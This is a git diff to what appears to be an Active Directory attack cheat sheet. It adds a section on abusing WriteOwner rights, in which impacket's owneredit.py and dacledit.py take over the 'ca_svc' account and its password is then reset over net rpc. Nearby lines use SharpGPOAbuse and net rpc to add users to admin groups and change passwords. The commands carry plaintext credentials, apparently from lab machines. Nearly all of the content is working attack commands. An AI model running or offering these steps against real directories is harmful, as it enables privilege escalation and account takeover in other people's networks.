@@ -210,7 +210,7 @@ Abuse:
 ./SharpGPOAbuse.exe --AddLocalAdmin --UserAccount anirudh --GPOName "Default Domain Policy" (add anirudh to local admin group)
 gpupdate /force
 ```
-#### Linux Abuse of Over large Permission Over Group
+#### Linux Abuse of Over large Permission Over Group and Object
 Add the user to the target group
 ```
 net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"
@@ -218,6 +218,16 @@ net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"Pa
 Change Existing user password
 ```
 net rpc password "JODIE.SUMMERS" "newP@ssword2022" -U "nara-security.com"/"Tracy.White"%"zqwj041FGX"@ -S "192.168.223.30"
+```
+#### Abusing WriteOwner over User
+```
+sudo timedatectl set-ntp off                                                                                          
+sudo rdate -n 10.10.11.51 
+python3 owneredit.py -action write -new-owner 'ryan' -target 'ca_svc' 'sequel.htb'/'ryan':'WqSZAF6CysDQbGb3'
+
+python3 dacledit.py -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' 'sequel.htb'/'ryan':'WqSZAF6CysDQbGb3'
+
+net rpc password "ca_svc" "test@password123" -U "sequel.htb"/"ryan"%"WqSZAF6CysDQbGb3" -S "10.10.11.51"
 ```
 #### Abusing Active Directory Certificates
 Enumerating vulnerable certificates
